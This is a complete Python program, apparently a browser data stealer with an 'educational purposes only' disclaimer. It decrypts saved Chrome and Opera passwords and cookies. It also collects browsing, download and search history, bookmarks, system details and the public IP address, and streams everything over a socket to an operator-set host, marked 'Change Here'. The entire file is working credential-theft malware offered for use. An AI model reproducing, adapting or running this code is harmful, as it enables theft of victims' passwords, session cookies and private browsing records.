import os, json, socket, base64, sqlite3, win32crypt, shutil, ctypes, getpass, requests, platform, subprocess, time
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta


#Google Chrome Password Script Source : https://www.thepythoncode.com/article/extract-chrome-passwords-python
#Coded By Kral4 | https://github.com/rootkral4
#Educational Purposes Only
#https://github.com/rootkral4/browserinfogather/LICENCE

# You should have received a copy of the MIT License
# along with this program.  If not, see <https://github.com/rootkral4/browserinfogather/LICENCE>.

host_ip = "127.0.0.1" # <----- Change Here
port = 3389

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((host_ip, port))
        break
    except:
        pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
def get_opera_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
            
def chrome():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    googletag = "*"*15+"Google"+"*"*15
    s.sendall(str(googletag).encode()+b"\n")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]   
        if username or password:
            s.sendall(b"Origin URL:"+origin_url.encode()+b"\n")
            s.sendall(b"Action URL:"+action_url.encode()+b"\n")
            s.sendall(b"Username :"+username.encode()+b"\n")
            s.sendall(b"Password :"+password.encode()+b"\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            s.sendall(b"Creation Date :"+str(get_chrome_datetime(date_created)).encode()+b"\n")
        if date_last_used != 86400000000 and date_last_used:
            s.sendall(b"Last Used Date :"+str(get_chrome_datetime(date_last_used)).encode()+b"\n")
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def chromehistory():
    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")
    filename = "ChromeHistoryData.db"
    shutil.copyfile(historypath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select url, title, visit_count, typed_count, last_visit_time from urls order by last_visit_time")
    s.sendall(b"**********Google History*********\n")
    for row in cursor.fetchall():
        url = row[0]
        title = row[1]
        visit_count = row[2]
        typed_count = row[3]
        last_visit_time = row[4]
        if url or title:
            s.sendall(b"URL :"+url.encode()+b"\n")
            s.sendall(b"Title :"+title.encode()+b"\n")
            s.sendall(b"Visit Count :"+str(visit_count).encode()+b"\n")
            s.sendall(b"Typed Count :"+str(typed_count).encode()+b"\n")
        else:
            continue
        if last_visit_time != 86400000000 and last_visit_time:
            s.sendall(b"Last Visit Time :"+str(get_chrome_datetime(last_visit_time)).encode()+b"\n")
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()   
    try:
        os.remove(filename)
    except:
        pass

def chromedownloadhistory():
    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")
    filename = "ChromeHistoryData.db"
    shutil.copyfile(historypath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select guid, current_path, target_path, start_time, received_bytes, total_bytes, state, danger_type, interrupt_reason, end_time, opened, last_access_time, referrer, site_url, tab_url, tab_referrer_url, etag, last_modified,mime_type,original_mime_type from downloads order by start_time")
    s.sendall(b"**********Google Download History*********\n")
    for row in cursor.fetchall():
        guid = row[0]
        current_path = row[1]
        target_path = row[2]
        start_time = row[3]
        received_bytes = row[4]
        total_bytes = row[5]
        state = row[6]
        danger_type = row[7]
        interrupt_reason = row[8]
        end_time = row[9]
        opened = row[10]
        last_access_time = row[11]
        referrer = row[12]
        site_url = row[13]
        tab_url = row[14]
        tab_referrer_url = row[15]
        etag = row[16]
        last_modified = row[17]
        mime_type = row[18]
        original_mime_type = row[19]
        if guid or original_mime_type:
            s.sendall(b"Guid :"+str(guid).encode()+b"\n")
            s.sendall(b"Current Path :"+str(current_path).encode()+b"\n")
            s.sendall(b"Target Path :"+str(target_path).encode()+b"\n")
            s.sendall(b"Received Bytes :"+str(received_bytes).encode()+b"\n")
            s.sendall(b"Total Bytes :"+str(total_bytes).encode()+b"\n")
            s.sendall(b"State :"+str(state).encode()+b"\n")
            s.sendall(b"Danger Type :"+str(danger_type).encode()+b"\n")
            s.sendall(b"Interrupt Reason :"+str(interrupt_reason).encode()+b"\n")
            s.sendall(b"Opened :"+str(opened).encode()+b"\n")
            s.sendall(b"Referrer :"+str(referrer).encode()+b"\n")
            s.sendall(b"Site Url ::"+str(site_url).encode()+b"\n")
            s.sendall(b"Tab Url :"+str(tab_url).encode()+b"\n")
            s.sendall(b"Tab Referrer Url :"+str(tab_referrer_url).encode()+b"\n")
            s.sendall(b"Last Modified :"+str(last_modified).encode()+b"\n")
            s.sendall(b"Mime Type:"+str(mime_type).encode()+b"\n")
            s.sendall(b"Original Mime Type:"+str(original_mime_type).encode()+b"\n")
        else:
            continue
        if start_time != 86400000000 and start_time:
            s.sendall(b"Start Time :"+str(get_chrome_datetime(start_time)).encode()+b"\n")
        if end_time != 86400000000 and end_time:
            s.sendall(b"End Time :"+str(get_chrome_datetime(end_time)).encode()+b"\n")  
        if last_access_time != 86400000000 and last_access_time:
            s.sendall(b"Last Access Time :"+str(get_chrome_datetime(last_access_time)).encode()+b"\n")  
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()   
    try:
        os.remove(filename)
    except:
        pass

def chromesearchtermshistory():
    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "History")
    filename = "ChromeHistoryData.db"
    shutil.copyfile(historypath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select term, normalized_term from keyword_search_terms order by keyword_id")
    s.sendall(b"**********Google Search Term History*********\n")
    for row in cursor.fetchall():
        term = row[0]
        normalized_term = row[1]
        if term or normalized_term:
            s.sendall(b"Term :"+str(term).encode()+b"\n")
            s.sendall(b"Normalized Term :"+str(normalized_term).encode()+b"\n")
            s.sendall(b"================================\n"+b"EOFD")
        else:
            continue
    cursor.close()
    db.close()   
    try:
        os.remove(filename)
    except:
        pass  

def googlecookies():
    key = get_encryption_key()
    cookiespath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Cookies")
    filename = "GoogleCookieData.db"
    shutil.copyfile(cookiespath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select creation_utc,host_key,name,value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,encrypted_value,samesite,source_scheme from cookies order by creation_utc")
    s.sendall(b"**********Google Cookies*********\n")
    for row in cursor.fetchall():
        creation_utc = row[0]
        host_key = row[1]
        name = row[2]
        value = row[3]
        path = row[4]
        expires_utc = row[5]
        is_secure = row[6]
        is_httponly = row[7]
        last_access_utc = row[8]
        has_expires = row[9]
        is_persistent = row[10]
        priority = row[11]
        encrypted_value = decrypt_password(row[12], key) 
        samesite = row[13]
        source_scheme = row[14]
        if encrypted_value:
            s.sendall(b"Cookie :"+str(encrypted_value).encode()+b"\n")
            s.sendall(b"Host Key :"+str(host_key).encode()+b"\n")
            s.sendall(b"Name :"+str(name).encode()+b"\n")
            s.sendall(b"Value :"+str(value).encode()+b"\n")
            s.sendall(b"Path :"+str(path).encode()+b"\n")
            s.sendall(b"isSecure :"+str(is_secure).encode()+b"\n")
            s.sendall(b"isHttponly :"+str(is_httponly).encode()+b"\n")
            s.sendall(b"Has Expires :"+str(has_expires).encode()+b"\n")
            s.sendall(b"is Persistent :"+str(is_persistent).encode()+b"\n")
            s.sendall(b"Priority :"+str(priority).encode()+b"\n")
            s.sendall(b"Same Site :"+str(samesite).encode()+b"\n")
            s.sendall(b"Source Scheme:"+str(source_scheme).encode()+b"\n")
        else:
            continue
        if creation_utc != 86400000000 and creation_utc:
            s.sendall(b"Creation Date :"+str(get_chrome_datetime(creation_utc)).encode()+b"\n")
        if expires_utc != 86400000000 and expires_utc:
            s.sendall(b"Expiry Date :"+str(get_chrome_datetime(expires_utc)).encode()+b"\n")
        if last_access_utc != 86400000000 and last_access_utc:
            s.sendall(b"Last Access Date :"+str(get_chrome_datetime(last_access_utc)).encode()+b"\n")
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass        

def googlebookmarks():
    bookmarkspath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Bookmarks")
    s.sendall(b"**********Google Bookmarks*********\n")
    with open(bookmarkspath,"r") as f:
        data = json.load(f)
    s.sendall(str(data).encode()+b'\n')
    s.sendall(b"================================\n"+b"EOFD")
    
def opera():
    key = get_opera_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Login Data")
    filename = "OperaData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    operatag = "*"*15+"Opera"+"*"*15
    s.sendall(str(operatag).encode()+b"\n")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]   
        if username or password:
            s.sendall(b"Origin URL:"+origin_url.encode()+b"\n")
            s.sendall(b"Action URL:"+action_url.encode()+b"\n")
            s.sendall(b"Username :"+username.encode()+b"\n")
            s.sendall(b"Password :"+password.encode()+b"\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            s.sendall(b"Creation Date :"+str(get_chrome_datetime(date_created)).encode()+b"\n")
        if date_last_used != 86400000000 and date_last_used:
            s.sendall(b"Last Used Date :"+str(get_chrome_datetime(date_last_used)).encode()+b"\n")
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def operadownloadhistory():
    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable","History")
    filename = "OperaHistoryData.db"
    shutil.copyfile(historypath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select guid, current_path, target_path, start_time, received_bytes, total_bytes, state, danger_type, interrupt_reason, end_time, opened, last_access_time, referrer, site_url, tab_url, tab_referrer_url, etag, last_modified,mime_type,original_mime_type from downloads order by start_time")
    s.sendall(b"**********Opera Download History*********\n")
    for row in cursor.fetchall():
        guid = row[0]
        current_path = row[1]
        target_path = row[2]
        start_time = row[3]
        received_bytes = row[4]
        total_bytes = row[5]
        state = row[6]
        danger_type = row[7]
        interrupt_reason = row[8]
        end_time = row[9]
        opened = row[10]
        last_access_time = row[11]
        referrer = row[12]
        site_url = row[13]
        tab_url = row[14]
        tab_referrer_url = row[15]
        etag = row[16]
        last_modified = row[17]
        mime_type = row[18]
        original_mime_type = row[19]
        if guid or original_mime_type:
            s.sendall(b"Guid :"+str(guid).encode()+b"\n")
            s.sendall(b"Current Path :"+str(current_path).encode()+b"\n")
            s.sendall(b"Target Path :"+str(target_path).encode()+b"\n")
            s.sendall(b"Received Bytes :"+str(received_bytes).encode()+b"\n")
            s.sendall(b"Total Bytes :"+str(total_bytes).encode()+b"\n")
            s.sendall(b"State :"+str(state).encode()+b"\n")
            s.sendall(b"Danger Type :"+str(danger_type).encode()+b"\n")
            s.sendall(b"Interrupt Reason :"+str(interrupt_reason).encode()+b"\n")
            s.sendall(b"Opened :"+str(opened).encode()+b"\n")
            s.sendall(b"Referrer :"+str(referrer).encode()+b"\n")
            s.sendall(b"Site Url ::"+str(site_url).encode()+b"\n")
            s.sendall(b"Tab Url :"+str(tab_url).encode()+b"\n")
            s.sendall(b"Tab Referrer Url :"+str(tab_referrer_url).encode()+b"\n")
            s.sendall(b"Last Modified :"+str(last_modified).encode()+b"\n")
            s.sendall(b"Mime Type:"+str(mime_type).encode()+b"\n")
            s.sendall(b"Original Mime Type:"+str(original_mime_type).encode()+b"\n")
        else:
            continue
        if start_time != 86400000000 and start_time:
            s.sendall(b"Start Time :"+str(get_chrome_datetime(start_time)).encode()+b"\n")
        if end_time != 86400000000 and end_time:
            s.sendall(b"End Time :"+str(get_chrome_datetime(end_time)).encode()+b"\n")  
        if last_access_time != 86400000000 and last_access_time:
            s.sendall(b"Last Access Time :"+str(get_chrome_datetime(last_access_time)).encode()+b"\n")  
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()   
    try:
        os.remove(filename)
    except:
        pass

def operasearchtermshistory():
    historypath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable","History")
    filename = "OperaHistoryData.db"
    shutil.copyfile(historypath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select term, normalized_term from keyword_search_terms order by keyword_id")
    s.sendall(b"\n**********Opera Search Term History*********\n")
    for row in cursor.fetchall():
        term = row[0]
        normalized_term = row[1]
        if term or normalized_term:
            s.sendall(b"Term :"+str(term).encode()+b"\n")
            s.sendall(b"Normalized Term :"+str(normalized_term).encode()+b"\n")
        else:
            continue
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()   
    try:
        os.remove(filename)
    except:
        pass  
        
def operacookies():
    key = get_opera_encryption_key()
    cookiespath = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Cookies")
    filename = "OperaCookieData.db"
    shutil.copyfile(cookiespath, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select creation_utc,host_key,name,value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,encrypted_value,samesite,source_scheme from cookies order by creation_utc")
    s.sendall(b"**********Opera Cookies*********\n")
    for row in cursor.fetchall():
        creation_utc = row[0]
        host_key = row[1]
        name = row[2]
        value = row[3]
        path = row[4]
        expires_utc = row[5]
        is_secure = row[6]
        is_httponly = row[7]
        last_access_utc = row[8]
        has_expires = row[9]
        is_persistent = row[10]
        priority = row[11]
        encrypted_value = decrypt_password(row[12], key) 
        samesite = row[13]
        source_scheme = row[14]
        if encrypted_value:
            s.sendall(b"Cookie :"+str(encrypted_value).encode()+b"\n")
            s.sendall(b"Host Key :"+str(host_key).encode()+b"\n")
            s.sendall(b"Name :"+str(name).encode()+b"\n")
            s.sendall(b"Value :"+str(value).encode()+b"\n")
            s.sendall(b"Path :"+str(path).encode()+b"\n")
            s.sendall(b"isSecure :"+str(is_secure).encode()+b"\n")
            s.sendall(b"isHttponly :"+str(is_httponly).encode()+b"\n")
            s.sendall(b"Has Expires :"+str(has_expires).encode()+b"\n")
            s.sendall(b"is Persistent :"+str(is_persistent).encode()+b"\n")
            s.sendall(b"Priority :"+str(priority).encode()+b"\n")
            s.sendall(b"Same Site :"+str(samesite).encode()+b"\n")
            s.sendall(b"Source Scheme:"+str(source_scheme).encode()+b"\n")
        else:
            continue
        if creation_utc != 86400000000 and creation_utc:
            s.sendall(b"Creation Date :"+str(get_chrome_datetime(creation_utc)).encode()+b"\n")
        if expires_utc != 86400000000 and expires_utc:
            s.sendall(b"Expiry Date :"+str(get_chrome_datetime(expires_utc)).encode()+b"\n")
        if last_access_utc != 86400000000 and last_access_utc:
            s.sendall(b"Last Access Date :"+str(get_chrome_datetime(last_access_utc)).encode()+b"\n")
        s.sendall(b"================================\n"+b"EOFD")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def operabookmarks():
    bookmarkspath = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable","Bookmarks")
    s.sendall(b"**********Opera Bookmarks*********\n")
    with open(bookmarkspath,"r") as f:
        data = json.load(f)
    s.sendall(str(data).encode()+b'\n')
    s.sendall(b"================================\n"+b"EOFD")
    

if __name__ == "__main__":
    try:
        r = requests.get("https://ifconfig.me")
        systeminfo = platform.uname()
        s.sendall(b"Username :"+getpass.getuser().encode()+b"\n")
        s.sendall(b"IP Address :"+r.text.encode()+b"\n")
        s.sendall(b"System :"+systeminfo.system.encode()+b"\n")
        s.sendall(b"Name :"+systeminfo.node.encode()+b"\n")
        s.sendall(b"Release :"+systeminfo.release.encode()+b"\n")
        s.sendall(b"Version :"+systeminfo.version.encode()+b"\n")
        s.sendall(b"Machine :"+systeminfo.machine.encode()+b"\n")
        s.sendall(b"Processor :"+systeminfo.processor.encode()+b"\n")
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            s.sendall(i[2:-2].encode()+b"\n")
    except:
        pass
    try:
        chrome()
    except Exception as ex:
        s.sendall(b"Google Saved Password - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        chromehistory()
    except Exception as ex:
        s.sendall(b"Google History - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        chromedownloadhistory()
    except Exception as ex:
        s.sendall(b"Google Download History - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        chromesearchtermshistory()
    except Exception as ex:
        s.sendall(b"Google Search Term History - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    time.sleep(1)
    try:
        googlecookies()
    except Exception as ex:
        s.sendall(b"Google Cookies - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        googlebookmarks()
    except Exception as ex:
        s.sendall(b"Google Bookmarks - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        opera()
    except Exception as ex:
        s.sendall(b"Opera Saved Password - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        operadownloadhistory()
    except Exception as ex:
        s.sendall(b"Opera Download History - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        operasearchtermshistory()
    except Exception as ex:
        s.sendall(b"Opera Search Term History - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        operacookies()
    except Exception as ex:
        s.sendall(b"Opera Cookies - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    try:
        operabookmarks()
    except Exception as ex:
        s.sendall(b"Opera Bookmarks - Something Went Wrong"+str(ex).encode()+b"\nEOFD")
        pass
    time.sleep(0.5)
    try:
        s.sendall(b"ALL DONEEOFD")
    except:
        pass